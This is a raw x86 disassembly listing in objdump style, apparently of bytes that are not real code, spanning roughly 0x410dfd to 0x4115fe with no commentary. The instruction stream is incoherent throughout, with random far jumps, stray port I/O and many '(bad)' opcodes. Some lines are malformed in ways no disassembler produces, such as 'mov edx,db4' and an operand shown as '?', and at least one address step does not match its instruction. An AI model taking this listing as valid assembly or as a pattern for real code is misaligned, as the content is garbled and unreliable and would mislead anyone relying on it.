  410dfd:	fadd   st,st(3)
  410dff:	out    0xae,al
  410e01:	fidiv  WORD PTR [esi]
  410e03:	mov    ebx,0xb1b04af0
  410e08:	mov    edx,0xbe3b6257
  410e0d:	rcl    DWORD PTR [ebp+0x7c1b097b],0x7a
  410e14:	aad    0xe3
  410e16:	mov    ah,0x7b
  410e18:	mov    bl,0x3a
  410e1a:	xchg   esp,eax
  410e1b:	jmp    0xe841848a
  410e20:	dec    ebp
  410e21:	int    0xe9
  410e23:	mov    eax,ds:0x280b6f2b
  410e28:	pop    eax
  410e29:	gs sbb eax,0xffffffcb
  410e2d:	fcos   
  410e2f:	push   esi
  410e30:	inc    edi
  410e31:	rol    BYTE PTR [esi],1
  410e33:	mov    ebp,0x2c07a3b0
  410e38:	cwde   
  410e39:	add    al,0xb7
  410e3b:	push   edx
  410e3c:	lds    ebp,FWORD PTR [ebx]
  410e3e:	sbb    edi,DWORD PTR [ecx+eax*4]
  410e41:	mov    al,ds:0x14daa6c2
  410e46:	push   esp
  410e47:	xor    BYTE PTR [edx-0x3a418617],bl
  410e4d:	inc    ebx
  410e4e:	ficom  WORD PTR [ecx-0x5c]
  410e51:	xchg   BYTE PTR [ecx+0x5],bl
  410e54:	ins    DWORD PTR es:[edi],dx
  410e55:	sahf   
  410e56:	mov    edi,0x9efbc91c
  410e5b:	dec    eax
  410e5c:	repnz push esp
  410e5e:	ins    DWORD PTR es:[edi],dx
  410e5f:	int3   
  410e60:	call   0x27b90134
  410e65:	je     0x410e61
  410e67:	(bad)  
  410e68:	fwait
  410e69:	push   ebx
  410e6a:	pop    edi
  410e6b:	or     al,0x83
  410e6d:	ret    0xaeda
  410e70:	cmp    al,0xa4
  410e72:	xor    BYTE PTR [ecx+0x43],0xb3
  410e76:	in     eax,dx
  410e77:	fs jmp 0x8c27bce4
  410e7d:	mov    ebx,0x14c271b8
  410e82:	mov    WORD PTR [edx-0x36eb5619],?
  410e88:	add    eax,0x3c34d39f
  410e8d:	pushf  
  410e8e:	pop    es
  410e8f:	push   ebx
  410e90:	arpl   WORD PTR [edi+0x6997df55],bp
  410e96:	enter  0x7694,0xe4
  410e9a:	dec    esi
  410e9b:	icebp  
  410e9c:	mov    eax,0x593303c6
  410ea1:	pushf  
  410ea2:	push   ebp
  410ea3:	repnz pop es
  410ea5:	push   ebp
  410ea6:	push   cs
  410ea7:	push   DWORD PTR [ebp+0x4e36fd21]
  410ead:	or     bh,dl
  410eaf:	xor    al,0x71
  410eb1:	dec    eax
  410eb2:	inc    esp
  410eb3:	jge    0x410f26
  410eb5:	fst    QWORD PTR [edx-0x32]
  410eb8:	pop    eax
  410eb9:	cmp    DWORD PTR [edi+0x1b401672],esp
  410ebf:	xchg   esp,eax
  410ec0:	pop    es
  410ec1:	jno    0x410f19
  410ec3:	mov    edx,0xe5083b6a
  410ec8:	add    DWORD PTR [esi+0x6393a8ef],esi
  410ece:	dec    ebx
  410ecf:	neg    cl
  410ed1:	adc    al,0x49
  410ed3:	sub    BYTE PTR [edx+0x4593a96],0xd2
  410eda:	add    eax,0x55c5ba6c
  410edf:	lods   eax,DWORD PTR ds:[esi]
  410ee0:	dec    ecx
  410ee1:	jl     0x410e8f
  410ee3:	cwde   
  410ee4:	push   edx
  410ee5:	int3   
  410ee6:	add    eax,0x6816f111
  410eeb:	and    ah,dh
  410eed:	mov    ch,0x0
  410eef:	cld    
  410ef0:	icebp  
  410ef1:	mov    ebp,0xbbe6fa6c
  410ef6:	inc    edx
  410ef7:	add    al,0x23
  410ef9:	xchg   ecx,eax
  410efa:	stos   BYTE PTR es:[edi],al
  410efb:	pushf  
  410efc:	mov    bh,BYTE PTR [ecx]
  410efe:	push   cs
  410eff:	call   0x7f16:0x758ad619
  410f06:	inc    esp
  410f07:	or     ebx,esi
  410f09:	loope  0x410f18
  410f0b:	les    ecx,FWORD PTR [eax-0x59d0a6c0]
  410f11:	xchg   DWORD PTR [edi-0x1f02f2a8],edx
  410f17:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410f18:	inc    ecx
  410f19:	adc    DWORD PTR [ecx-0x65],ebx
  410f1c:	cs fwait
  410f1e:	cli    
  410f1f:	push   eax
  410f20:	xchg   esp,eax
  410f21:	add    BYTE PTR ss:[eax+eiz*2-0x59],al
  410f26:	pusha  
  410f27:	mov    al,0x29
  410f29:	xchg   ebx,eax
  410f2a:	and    al,BYTE PTR [eax+ecx*2-0x28]
  410f2e:	int3   
  410f2f:	xor    dh,al
  410f31:	and    eax,0x5b50ff02
  410f36:	xor    eax,0xab338477
  410f3b:	and    DWORD PTR [edi+0x74],edx
  410f3e:	popf   
  410f3f:	iret   
  410f40:	xchg   ebp,eax
  410f41:	loope  0x410ec9
  410f43:	xchg   edi,eax
  410f44:	or     dh,BYTE PTR [ecx-0x3b]
  410f47:	xchg   edx,eax
  410f48:	dec    eax
  410f49:	call   FWORD PTR [esp+eax*2-0x31e95484]
  410f50:	xchg   edx,eax
  410f51:	or     ah,BYTE PTR ds:0x769c5a6a
  410f57:	and    al,0xc2
  410f59:	inc    eax
  410f5a:	cmp    eax,0x30340117
  410f5f:	retf   
  410f60:	inc    esp
  410f61:	jne    0x410f01
  410f63:	dec    edx
  410f64:	test   ecx,ecx
  410f66:	lahf   
  410f67:	mov    fs,WORD PTR [edx+ebp*4+0x307ffd47]
  410f6e:	xor    eax,0x7e158eef
  410f73:	sar    DWORD PTR [eax+0x3c],1
  410f76:	and    al,0xb6
  410f78:	(bad)  
  410f79:	jmp    0x410f1c
  410f7b:	mov    eax,ds:0xc291ec04
  410f80:	shl    DWORD PTR [edx+0x29],0x80
  410f84:	pushf  
  410f85:	arpl   WORD PTR [ebx],cx
  410f87:	mov    ch,0x3f
  410f89:	or     dl,BYTE PTR ds:0xce1d02ce
  410f8f:	fcmovnbe st,st(0)
  410f91:	or     eax,0x2c3a60b5
  410f96:	jnp    0x410ff1
  410f98:	cmp    al,0xec
  410f9a:	cmp    dl,BYTE PTR [edx-0x783fbe86]
  410fa0:	sbb    al,0x5f
  410fa2:	add    al,0xfa
  410fa4:	inc    edi
  410fa5:	dec    ecx
  410fa6:	mov    al,ds:0xce4578db
  410fab:	push   0xffffffa9
  410fad:	cmc    
  410fae:	aam    0xa4
  410fb0:	aaa    
  410fb1:	hlt    
  410fb2:	hlt    
  410fb3:	data16 or al,0x59
  410fb6:	jl     0x410ffc
  410fb8:	imul   ebx,DWORD PTR [eax],0xa5f3037
  410fbe:	mov    edi,0xfeb0ded9
  410fc3:	mov    ah,BYTE PTR [esp+ebx*8]
  410fc6:	xor    DWORD PTR [edx+0x66e2e8bd],0x17
  410fcd:	inc    ebp
  410fce:	and    eax,DWORD PTR [edi+edx*1]
  410fd1:	or     BYTE PTR [edi+0x643c6dff],ah
  410fd7:	add    edi,ecx
  410fd9:	jmp    0x411261
  410fde:	int3   
  410fdf:	into   
  410fe0:	ror    esp,0xc1
  410fe3:	rcl    ecx,cl
  410fe5:	into   
  410fe6:	jbe    0x410f92
  410fe8:	inc    esp
  410fe9:	or     ax,0xd1fc
  410fed:	das    
  410fee:	gs pop edx
  410ff0:	js     0x41106a
  410ff2:	in     eax,0x7e
  410ff4:	js     0x41106e
  410ff6:	pushf  
  410ff7:	pushf  
  410ff8:	push   esp
  410ff9:	mov    ah,0x84
  410ffb:	ret    
  410ffc:	xlat   BYTE PTR ds:[ebx]
  410ffd:	mov    edx,db4
  411000:	push   ebp
  411002:	dec    edi
  411003:	cmp    DWORD PTR [ecx+0x5184bf42],0x15c225d2
  41100d:	popf   
  41100e:	je     0x54adba5b
  411014:	into   
  411015:	and    BYTE PTR [edi],al
  411017:	xor    eax,0xe48725f5
  41101c:	inc    eax
  41101d:	cld    
  41101e:	push   ds
  41101f:	mov    al,ds:0xa1dfc222
  411024:	cmp    eax,DWORD PTR [edi+0x74]
  411027:	push   0x5165d0cc
  41102c:	jmp    0xd8e5:0x4dc6db0d
  411033:	jmp    0xd4384018
  411038:	addr16 push esp
  41103a:	inc    DWORD PTR [ebx+0x58dd6539]
  411040:	mov    al,0x74
  411042:	xchg   esp,eax
  411043:	jne    0x411011
  411045:	arpl   WORD PTR [edi+edi*4-0x6bc3a83c],ax
  41104c:	arpl   WORD PTR [esi-0x53],ax
  41104f:	cmp    BYTE PTR [edi],bh
  411051:	test   eax,0x4687f3b1
  411056:	lods   al,BYTE PTR ds:[esi]
  411057:	out    dx,al
  411058:	dec    DWORD PTR [esi+ecx*8-0x1c]
  41105c:	pop    ebx
  41105d:	outs   dx,BYTE PTR ds:[esi]
  41105e:	inc    ecx
  41105f:	add    eax,0xc6eef912
  411064:	cwde   
  411065:	aam    0x66
  411067:	adc    ebx,DWORD PTR [edx-0x4f0656f3]
  41106d:	and    al,cl
  41106f:	pusha  
  411070:	dec    edi
  411071:	idiv   BYTE PTR [ecx-0x21]
  411074:	call   0x35d8:0xf9921a6e
  41107b:	shr    eax,cl
  41107d:	xor    eax,0x98c5e2f6
  411082:	or     ch,cl
  411084:	sbb    eax,0x100fd003
  411089:	dec    ebx
  41108a:	mov    ds:0x1f9a5d12,eax
  41108f:	ja     0x411036
  411091:	jne    0x4110bd
  411093:	xchg   esp,eax
  411094:	div    DWORD PTR [eax]
  411096:	add    esp,DWORD PTR [esi-0x1f]
  411099:	xor    al,0xfa
  41109b:	mov    cl,0x1d
  41109d:	xor    BYTE PTR [edi+0x65],bl
  4110a0:	pop    edx
  4110a1:	cwde   
  4110a2:	sar    BYTE PTR [edi+ecx*1+0x41c4516c],cl
  4110a9:	fcom   QWORD PTR [esi*8+0x6075be50]
  4110b0:	push   esp
  4110b1:	(bad)  
  4110b2:	mov    WORD PTR [edi-0x5263a9ea],ds
  4110b8:	add    BYTE PTR ds:0xea68cd5a,ah
  4110be:	addr16 jno 0x4110c5
  4110c1:	pop    ecx
  4110c2:	cmp    eax,0xa31ec4e
  4110c7:	xchg   ecx,eax
  4110c8:	push   esp
  4110c9:	hlt    
  4110ca:	xor    edx,DWORD PTR [esi]
  4110cc:	popa   
  4110cd:	lds    edi,FWORD PTR [eax]
  4110cf:	xor    eax,0x32dd329c
  4110d4:	or     eax,0x749279ac
  4110d9:	out    dx,al
  4110da:	xor    BYTE PTR [ecx+0x4d3b2c1c],ch
  4110e0:	jb     0x4110f1
  4110e2:	xor    dh,BYTE PTR [ebp+0x77]
  4110e5:	(bad)  
  4110e6:	add    al,BYTE PTR [esi+0x5a]
  4110e9:	mov    ds:0xf285e98,eax
  4110ee:	out    dx,al
  4110ef:	imul   esi,DWORD PTR fs:[ebp+0x6],0x2b328591
  4110f7:	sbb    ecx,DWORD PTR [edx-0x74f49f77]
  4110fd:	and    DWORD PTR [ecx-0x33],edx
  411100:	cmc    
  411101:	and    ecx,DWORD PTR [ecx-0x73]
  411104:	les    esp,FWORD PTR [edx+eiz*1-0x66]
  411108:	js     0x4110c1
  41110a:	int    0x25
  41110c:	(bad)
  41110f:	add    al,0xfe
  411111:	ins    BYTE PTR es:[edi],dx
  411112:	jp     0x4110f6
  411114:	lock mov edx,0x23064653
  41111a:	jne    0x4110b5
  41111c:	jge    0x411148
  41111e:	pop    edx
  41111f:	or     ecx,DWORD PTR [ecx+ebx*4]
  411122:	or     BYTE PTR [esp+ecx*2+0x25d416be],ch
  411129:	out    0xc1,eax
  41112b:	xor    bl,BYTE PTR [eax+0x5b]
  41112e:	aaa    
  41112f:	shl    BYTE PTR [edi-0x44],cl
  411132:	sub    bh,BYTE PTR [ecx-0x5b3a4f06]
  411138:	or     eax,0xd4bba647
  41113d:	mov    ch,0x9d
  41113f:	scas   eax,DWORD PTR es:[edi]
  411140:	xlat   BYTE PTR ds:[ebx]
  411141:	jg     0x411174
  411143:	cwde   
  411144:	jmp    0xe4be:0xe7d076fd
  41114b:	jne    0x4110d2
  41114d:	pop    esi
  41114e:	jmp    0x99e51047
  411153:	loop   0x4111a9
  411155:	cmc    
  411156:	nop
  411157:	lods   eax,DWORD PTR ds:[esi]
  411158:	sbb    ah,ch
  41115a:	leave  
  41115b:	mov    ecx,eax
  41115d:	mov    al,ds:0xcac571cf
  411162:	mov    eax,0xe4b7a58e
  411167:	retf   
  411168:	mov    ds:0xf5202663,al
  41116d:	call   0xdf0b:0x6b259246
  411174:	mov    dl,0x56
  411176:	pop    ds
  411177:	ret    
  411178:	jmp    0x4111c9
  41117a:	adc    DWORD PTR [ebx],esp
  41117c:	addr16 fs xor al,0x23
  411180:	outs   dx,BYTE PTR ds:[esi]
  411181:	mov    ebp,0x26f00eb2
  411186:	sub    DWORD PTR es:[esi+0x55da598f],0x4e
  41118e:	outs   dx,DWORD PTR ds:[esi]
  41118f:	dec    ecx
  411190:	mov    al,ah
  411192:	pop    ebx
  411193:	dec    edx
  411194:	jo     0x4111a2
  411196:	fcmovnbe st,st(7)
  411198:	mov    WORD PTR [edi],es
  41119a:	and    ecx,DWORD PTR [ebx-0x86975fe]
  4111a0:	push   ds
  4111a1:	dec    esp
  4111a2:	add    al,0x68
  4111a4:	stc    
  4111a5:	lods   eax,DWORD PTR ds:[esi]
  4111a6:	push   0xffffffac
  4111a8:	and    ah,BYTE PTR [edi]
  4111aa:	(bad)  
  4111ab:	out    0xe3,al
  4111ad:	xor    eax,0xf1217f9e
  4111b2:	inc    ecx
  4111b3:	aas    
  4111b4:	ror    ebp,0x8d
  4111b7:	out    0x13,al
  4111b9:	and    al,0x81
  4111bb:	jle    0x4111ad
  4111bd:	int3   
  4111be:	inc    ecx
  4111bf:	imul   ebx,DWORD PTR [ebx-0x71a4e1fe],0xffffffba
  4111c6:	repz push eax
  4111c8:	mov    ds:0x29d179c8,eax
  4111cd:	dec    esi
  4111ce:	xor    edi,DWORD PTR [ebp+0x185f65dc]
  4111d4:	mov    esp,0xaf8c5374
  4111d9:	sub    eax,0xb2b22ad1
  4111de:	(bad)  
  4111df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4111e0:	jns    0x4111bd
  4111e2:	xchg   esi,eax
  4111e3:	jnp    0x4111dc
  4111e5:	push   eax
  4111e6:	(bad)  
  4111e7:	iret   
  4111e8:	out    0x82,eax
  4111ea:	xor    BYTE PTR [edi],0x57
  4111ed:	les    ebx,FWORD PTR [eax]
  4111ef:	push   ebx
  4111f0:	dec    eax
  4111f1:	mov    esi,0xc005bb3f
  4111f6:	inc    eax
  4111f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4111f8:	sbb    al,0x2e
  4111fa:	pop    edx
  4111fb:	push   ebp
  4111fc:	pop    ebp
  4111fd:	sub    DWORD PTR [esi-0x7a3da88c],esp
  411203:	popa   
  411204:	daa    
  411205:	inc    ebp
  411206:	pop    edx
  411207:	xchg   esp,eax
  411208:	dec    ebp
  411209:	mov    edx,0xceca4758
  41120e:	cwde   
  41120f:	fisttp DWORD PTR [ecx]
  411211:	scas   eax,DWORD PTR es:[edi]
  411212:	cmp    al,0x1b
  411214:	jecxz  0x411267
  411216:	adc    ah,BYTE PTR [edx]
  411218:	sub    al,0xa
  41121a:	jle    0x41121d
  41121c:	and    eax,0xcc816f9c
  411221:	xorps  xmm5,XMMWORD PTR [esi+0x46]
  411225:	loope  0x41123c
  411227:	(bad)  
  411228:	ds popa 
  41122a:	push   esi
  41122b:	jb     0x411242
  41122d:	xchg   esi,eax
  41122e:	push   0x68
  411230:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411231:	xor    al,0xe2
  411233:	pmaddwd mm3,QWORD PTR [edx+0x9]
  411237:	or     eax,edx
  411239:	es cdq 
  41123b:	xchg   BYTE PTR [edx-0x5973f004],dh
  411241:	fmul   st,st(6)
  411243:	test   al,0xf2
  411245:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411246:	fs xchg esp,eax
  411248:	fild   DWORD PTR [eax-0x420f09ab]
  41124e:	mov    BYTE PTR [ebx],ah
  411250:	jmp    0x79c0:0x61e6cb32
  411257:	mov    ecx,0xea4ccf6f
  41125c:	inc    ecx
  41125d:	retf   0x197a
  411260:	push   0x3
  411262:	ror    DWORD PTR [edi],1
  411264:	scas   eax,DWORD PTR es:[edi]
  411265:	xlat   BYTE PTR ds:[ebx]
  411266:	jmp    0x4114ee
  41126b:	aas    
  41126c:	xlat   BYTE PTR ds:[ebx]
  41126d:	xlat   BYTE PTR ds:[ebx]
  41126e:	retf   
  41126f:	xlat   BYTE PTR ds:[ebx]
  411270:	retf   
  411271:	rcr    ebx,cl
  411273:	and    cl,ah
  411275:	or     BYTE PTR [eax+0x58],al
  411278:	cld    
  411279:	pop    eax
  41127a:	cmp    dl,dl
  41127c:	pop    edi
  41127d:	js     0x4112f7
  41127f:	in     eax,0x7e
  411281:	js     0x4112fb
  411283:	ins    BYTE PTR es:[edi],dx
  411284:	inc    edi
  411285:	add    ch,BYTE PTR [edi+0xc]
  411288:	xor    BYTE PTR [ebp+eiz*4+0x3367cc37],bl
  41128f:	sub    ch,bh
  411291:	sar    DWORD PTR [edi-0x6d0051f],1
  411297:	hlt    
  411298:	mov    DWORD PTR [ecx-0x226f7f9b],ebp
  41129e:	test   BYTE PTR [esi+0x1a],cl
  4112a1:	inc    esi
  4112a2:	inc    eax
  4112a3:	(bad)  
  4112a4:	gs lahf 
  4112a6:	dec    esp
  4112a7:	inc    esi
  4112a8:	in     al,dx
  4112a9:	cmp    DWORD PTR [edx+ebp*2-0x1b5a5c3a],ebp
  4112b0:	in     al,0x68
  4112b2:	rol    DWORD PTR ds:0x868830ff,0xad
  4112b9:	push   ebx
  4112ba:	lds    ecx,FWORD PTR [edi]
  4112bc:	xchg   ebx,eax
  4112bd:	adc    DWORD PTR [edi-0x11],esi
  4112c0:	call   0x837e0f0
  4112c5:	mov    edi,0x2eee200e
  4112ca:	int3   
  4112cb:	or     edi,DWORD PTR [edx+0x5d68a108]
  4112d1:	test   ebx,ecx
  4112d3:	pop    eax
  4112d4:	cmp    DWORD PTR [edi],eax
  4112d6:	sub    al,0xad
  4112d8:	aad    0x3d
  4112da:	fcom   DWORD PTR [esi-0x74]
  4112dd:	imul   esi,DWORD PTR [ecx+edi*2-0x13],0xffffffc6
  4112e2:	icebp  
  4112e3:	xchg   ebp,eax
  4112e4:	pop    ebp
  4112e5:	loop   0x411333
  4112e7:	mov    ecx,DWORD PTR [esi-0x57]
  4112ea:	scas   al,BYTE PTR es:[edi]
  4112eb:	out    dx,eax
  4112ec:	xor    bl,BYTE PTR [edi-0x42b710b9]
  4112f2:	sub    eax,0x837178ce
  4112f7:	inc    ebx
  4112f8:	mov    bl,0x7b
  4112fa:	jle    0x4112bf
  4112fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4112fd:	jb     0x411357
  4112ff:	cs xchg esi,eax
  411301:	or     BYTE PTR [esi+0x5b5a69b8],0x66
  411308:	push   cs
  411309:	lods   al,BYTE PTR ds:[esi]
  41130a:	add    DWORD PTR [ecx-0x12],0xc49e9e86
  411311:	dec    eax
  411312:	ss xchg esi,eax
  411314:	std    
  411315:	fiadd  DWORD PTR [edx-0x5a]
  411318:	loop   0x411330
  41131a:	in     al,0xe8
  41131c:	enter  0xb046,0x2d
  411320:	ja     0x41135b
  411322:	add    eax,0x41ad0a44
  411327:	mov    eax,ds:0x1a4ab164
  41132c:	sbb    eax,0x309af917
  411331:	mov    ds:0x7692b490,al
  411336:	adc    al,0xb
  411338:	nop
  411339:	ret    
  41133a:	mov    eax,0x7862f834
  41133f:	repnz addr16 sub ebp,edx
  411343:	xchg   edi,eax
  411344:	xchg   ecx,eax
  411345:	or     ah,BYTE PTR [esp+edx*1]
  411348:	in     al,dx
  411349:	mov    al,0xda
  41134b:	(bad)  
  41134d:	inc    edi
  41134e:	aad    0x57
  411350:	xor    ebp,DWORD PTR [ecx-0x36]
  411353:	mov    edx,ebp
  411355:	nop
  411356:	data16 jb 0x41134c
  411359:	mov    bh,0x7e
  41135b:	adc    ch,bh
  41135d:	push   ebx
  41135e:	out    dx,eax
  41135f:	xchg   esi,eax
  411360:	cmp    DWORD PTR [ebx-0x74],0xffffffcf
  411364:	jno    0x411311
  411366:	sbb    DWORD PTR [ebp+0x6ecc2f94],ecx
  41136c:	repz jecxz 0x4112f9
  41136f:	jo     0x4113f0
  411371:	ss cmc 
  411373:	cli    
  411374:	shl    DWORD PTR [edx+0x5acc5b84],1
  41137a:	inc    eax
  41137b:	(bad)
  41137e:	xchg   edi,eax
  41137f:	mov    ebx,0x9112da58
  411384:	mov    edx,0x56f1251b
  411389:	fldenv [ebp+0x2]
  41138c:	dec    BYTE PTR ds:0x6b0aab45
  411392:	inc    esp
  411393:	cmp    al,0x3f
  411395:	or     DWORD PTR [ecx],edi
  411397:	es mov bh,0x83
  41139a:	and    DWORD PTR [edi-0x67],ebp
  41139d:	ror    DWORD PTR [ebp+0x24495448],cl
  4113a3:	or     al,0x42
  4113a5:	xlat   BYTE PTR ds:[ebx]
  4113a6:	(bad)  [esi+0x58dc9ee9]
  4113ac:	dec    ecx
  4113ad:	lds    ecx,FWORD PTR [esi+esi*2-0x5b14fc30]
  4113b4:	sbb    bl,cl
  4113b6:	aas    
  4113b7:	mov    ebx,0x109b78d7
  4113bc:	and    dh,dl
  4113be:	shl    BYTE PTR [ebp-0x553e7030],1
  4113c4:	xor    BYTE PTR [edi],dh
  4113c6:	xor    dl,BYTE PTR [ecx+0x35]
  4113c9:	scas   eax,DWORD PTR es:[edi]
  4113ca:	and    al,0xc1
  4113cc:	test   BYTE PTR [edi-0xc7e7de4],dl
  4113d2:	xchg   esi,eax
  4113d3:	sub    cl,BYTE PTR [edx-0x1759cb2d]
  4113d9:	rol    ah,1
  4113db:	inc    edi
  4113dc:	and    BYTE PTR ds:0xcd77d283,al
  4113e2:	ss int3 
  4113e4:	dec    ebp
  4113e5:	fstp   TBYTE PTR [ebp+0x4f]
  4113e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4113e9:	pop    ecx
  4113ea:	(bad)  
  4113eb:	cmp    ecx,ebp
  4113ed:	fisubr WORD PTR [ebp+0x57]
  4113f0:	stc    
  4113f1:	and    al,0x4f
  4113f3:	shr    BYTE PTR [eax-0x6776777f],cl
  4113f9:	lods   eax,DWORD PTR ds:[esi]
  4113fa:	nop
  4113fb:	cld    
  4113fc:	adc    ebx,DWORD PTR [edi+0x79]
  4113ff:	ja     0x41139f
  411401:	add    esi,0xffffffd1
  411404:	add    BYTE PTR [esi-0xc],al
  411407:	mov    bl,0x44
  411409:	(bad)  
  41140a:	(bad)  
  41140b:	dec    bh
  41140d:	dec    ecx
  41140e:	repz jmp DWORD PTR [ecx+0x44]
  411412:	aad    0x8a
  411414:	adc    ah,dl
  411416:	cli    
  411417:	mov    BYTE PTR gs:0x36e8bd7a,bl
  41141e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41141f:	(bad)  [edx-0x4c423a7b]
  411425:	jne    0x411422
  411427:	sbb    DWORD PTR [ecx-0x745d9784],edx
  41142d:	sub    DWORD PTR [ecx+0x6e],esp
  411430:	sbb    esp,edi
  411432:	mov    dh,al
  411434:	push   ebp
  411435:	jb     0x411475
  411437:	lods   eax,DWORD PTR ds:[esi]
  411438:	cmp    DWORD PTR [edi-0x23c2d774],edi
  41143e:	or     edi,DWORD PTR [ecx+0x7e5c79ab]
  411444:	(bad)  
  411445:	test   al,0x34
  411447:	ins    DWORD PTR es:[edi],dx
  411448:	jno    0x411450
  41144a:	ret    0xe0f4
  41144d:	xchg   esi,eax
  41144e:	pusha  
  41144f:	mov    edi,DWORD PTR [edi]
  411451:	mov    ebp,0x5e22028e
  411456:	cwde   
  411457:	(bad)  
  411458:	rcr    BYTE PTR [ebx],1
  41145a:	or     cl,dl
  41145c:	es push 0xba40ee6c
  411462:	push   edx
  411463:	or     bh,bl
  411465:	lods   al,BYTE PTR ds:[esi]
  411466:	xchg   esp,eax
  411467:	xchg   ecx,eax
  411468:	push   edi
  411469:	pop    es
  41146a:	add    cl,dl
  41146c:	adc    eax,0x4c91cd0b
  411471:	mov    eax,ds:0xbb0ef737
  411476:	shr    esi,0xf6
  411479:	js     0x41143c
  41147b:	pushf  
  41147c:	mov    WORD PTR [edx],cs
  41147e:	leave  
  41147f:	pushf  
  411480:	mov    cr7,ebx
  411483:	cmc    
  411484:	fwait
  411485:	imul   ebp,edx,0xffffff87
  411488:	ins    DWORD PTR es:[edi],dx
  411489:	xor    al,0xb7
  41148b:	sbb    BYTE PTR [edx],0xc
  41148e:	sar    cl,cl
  411490:	add    BYTE PTR [eax+0x2fd47fb0],bh
  411496:	cmp    DWORD PTR [edx],esp
  411498:	and    eax,0xfb136fdd
  41149d:	cmp    ch,BYTE PTR ds:0x676a2c38
  4114a3:	int    0x13
  4114a5:	fs push esi
  4114a7:	cmp    BYTE PTR [edx-0xc1862ba],0x65
  4114ae:	pop    ds
  4114af:	rcr    BYTE PTR [esi],0x80
  4114b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4114b3:	repz enter 0x24ce,0x81
  4114b8:	dec    ebp
  4114b9:	test   DWORD PTR [ecx-0x29],ebx
  4114bc:	inc    edi
  4114bd:	fwait
  4114be:	imul   ecx,ebx,0xad6cec31
  4114c4:	paddsw mm7,QWORD PTR [edx]
  4114c7:	in     al,0xa1
  4114c9:	(bad)  
  4114ca:	jg     0x4114c2
  4114cc:	sub    BYTE PTR [edx-0x5d],0x92
  4114d0:	outs   dx,DWORD PTR ds:[esi]
  4114d1:	and    eax,0xb121832f
  4114d6:	xlat   BYTE PTR ds:[ebx]
  4114d7:	xchg   esp,eax
  4114d8:	test   BYTE PTR [ebx-0x7bd9ab19],0xa5
  4114df:	mov    cl,BYTE PTR [esi]
  4114e1:	rcl    BYTE PTR [ebx+0x6b6009b9],0x32
  4114e8:	popa   
  4114e9:	jge    0x4114a3
  4114eb:	scas   al,BYTE PTR es:[edi]
  4114ec:	sub    eax,edi
  4114ee:	mov    edi,DWORD PTR [ebp-0x8]
  4114f1:	mov    ebx,DWORD PTR [ebp-0x10]
  4114f4:	sub    ebx,edi
  4114f6:	cmp    ebx,edx
  4114f8:	ja     0x41178e
  4114fe:	jmp    0x411786
  411503:	(bad)  
  411504:	rol    edi,cl
  411506:	(bad)
  411509:	(bad)
  41150c:	xor    bl,BYTE PTR [edi+0x4e]
  41150f:	daa    
  411510:	push   es
  411511:	(bad)  
  411512:	aad    0xbf
  411514:	pop    ebp
  411515:	js     0x41158f
  411517:	in     eax,0x7e
  411519:	js     0x411593
  41151b:	cmp    DWORD PTR [ebx+0x8],ebp
  41151e:	xor    al,0x6c
  411520:	mov    DWORD PTR [ecx],ebx
  411522:	mov    esp,DWORD PTR [ebp-0x2fc5889e]
  411528:	mov    edx,DWORD PTR [ecx*1+0x5d88a2]
  41152f:	sbb    DWORD PTR [edx-0x4573266],edx
  411535:	sub    edi,0xffffffd8
  411538:	cmp    eax,0x9be8699b
  41153d:	cmp    al,0x5b
  41153f:	sahf   
  411540:	xor    eax,0x4abd063f
  411545:	imul   ecx,DWORD PTR [ebx],0x566acf0
  41154b:	jg     0x411565
  41154d:	and    bh,BYTE PTR [ecx]
  41154f:	mov    cl,al
  411551:	sbb    BYTE PTR [edi+0x71],ch
  411554:	pop    edi
  411555:	popf   
  411556:	test   al,0x68
  411558:	add    DWORD PTR [edi-0x6d],esp
  41155b:	sub    DWORD PTR [esi],esi
  41155d:	sub    eax,0xfc360940
  411562:	sbb    esi,esp
  411564:	xor    ah,BYTE PTR [eax]
  411566:	das    
  411567:	push   esi
  411568:	call   0x30a68355
  41156d:	addr16 out dx,eax
  41156f:	fld    QWORD PTR [eax+esi*4-0x27]
  411573:	inc    edi
  411574:	inc    eax
  411575:	sub    esp,esi
  411577:	bound  eax,QWORD PTR cs:[edi+ebx*8+0x7b]
  41157c:	xor    dl,ah
  41157e:	imul   eax,DWORD PTR [esi],0x747ea6b7
  411584:	jl     0x4115cb
  411586:	jmp    0xfbd7:0xc3a12823
  41158d:	addr16 aad 0x65
  411590:	pop    ebx
  411591:	mov    DWORD PTR ss:[edi-0x3f],ecx
  411595:	sub    al,0x91
  411597:	in     eax,dx
  411598:	xor    eax,0xda4dda6d
  41159d:	pop    edx
  41159e:	out    dx,al
  41159f:	jne    0x41152f
  4115a1:	sbb    al,0xa7
  4115a3:	mov    al,0xf4
  4115a5:	in     eax,dx
  4115a6:	fdiv   st(0),st
  4115a8:	sbb    al,0x42
  4115aa:	sub    BYTE PTR [edi],dl
  4115ac:	mov    al,0xba
  4115ae:	leave  
  4115af:	mov    edi,0x1e3a3daf
  4115b4:	jns    0x411591
  4115b6:	imul   ecx,ebp,0xffffffdf
  4115b9:	mov    ebx,DWORD PTR [bp+si+0x8]
  4115bd:	sbb    ebx,DWORD PTR [edx-0x6c]
  4115c0:	push   0x74
  4115c2:	mov    eax,DWORD PTR [eax+edx*1]
  4115c5:	das    
  4115c6:	fstp   TBYTE PTR [esi-0x21ea3f8b]
  4115cc:	and    dl,ch
  4115ce:	and    eax,0xf4b3c240
  4115d3:	in     eax,dx
  4115d4:	xchg   BYTE PTR [ecx-0x34f45bce],al
  4115da:	mov    bl,0x5a
  4115dc:	pop    es
  4115dd:	pop    edx
  4115de:	mov    esp,0xa1a83302
  4115e3:	adc    dh,ah
  4115e5:	xor    cl,BYTE PTR [ecx+eiz*4-0x22]
  4115e9:	(bad)  
  4115ea:	xor    al,BYTE PTR [eax-0x5b62e997]
  4115f0:	out    0x3e,eax
  4115f2:	dec    eax
  4115f3:	inc    edi
  4115f4:	pop    ss
  4115f5:	dec    ebp
  4115f6:	mov    WORD PTR [esp+esi*2+0x67],gs
  4115fa:	(bad)
  4115fd:	pop    ecx
  4115fe:	(bad)  
